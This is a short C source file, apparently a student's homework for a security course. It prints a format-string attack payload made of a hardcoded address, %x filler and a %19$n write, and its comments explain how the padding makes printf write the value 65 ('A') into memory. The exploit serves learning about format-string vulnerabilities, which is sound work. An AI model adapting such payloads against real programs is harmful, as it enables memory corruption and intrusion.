// Jennifer Long
// rz5sc
// CS 4630 HW 10
// format_string_attack.c

#include <stdio.h>
#include <string.h>

// attackString is comprised of the following, in order:
// Saved ebp
// Filler %x commands
// %n
// My name
// Since %n writes the number of characters printed,
// the tricky part was figuring out how to get it to print
// exactly 65 characters, the ascii value of "A".
char attackString[] = "\x28\xa0\x04\x08 %59x %19$n\n Jennifer Long";

int main() {
 int i;
 char *p = attackString;
 for (i = 0; i < sizeof(attackString); i++) {
   putchar(*p);
   p++;
 }
 return 1;
}
